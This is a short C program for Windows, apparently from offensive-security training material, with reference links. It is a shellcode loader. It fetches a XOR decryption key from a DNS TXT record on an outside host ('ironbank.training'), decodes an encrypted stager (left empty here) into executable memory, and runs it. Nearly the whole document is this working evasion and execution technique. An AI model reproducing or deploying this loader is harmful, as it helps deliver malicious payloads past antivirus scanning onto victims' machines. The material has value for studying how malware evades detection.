```
#include <windows.h>
#include <windns.h>

unsigned char stager[] = { };

DWORD getKey(void) {
	PDNS_RECORD txtData;
	DNS_STATUS status;

	
	status = DnsQuery_A("ironbank.training", DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &txtData, NULL);
	if (status != 0) {
		return 0;
	}

	
	return *(DWORD*)(*txtData->Data.Txt.pStringArray);
}

void decode(DWORD key, const char *input, char *output, DWORD len) {
	int i = 0;

	for (i = 0; i < len; i+=4) {
		*(DWORD*)(output+i) = *(DWORD *)(input+i) ^ key;
		key++;
	}
}

int main()
{
	DWORD oldProtect;
	void* decryptedStager;

	decryptedStager = VirtualAlloc(NULL, sizeof(stager), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
	//int (*shellcode)() = (int(*)())(void*)stager;
	decode(getKey(), stager, (char*)decryptedStager, sizeof(stager));
	int (*shellcode)() = (int(*)())(void*)decryptedStager;
	shellcode();
}
```
# References


* [DnsQuery_W function] (https://docs.microsoft.com/en-us/windows/win32/api/windns/nf-windns-dnsquery_w)
* [Memory Protection] (https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)
* [Windows Shellcode] (https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques)
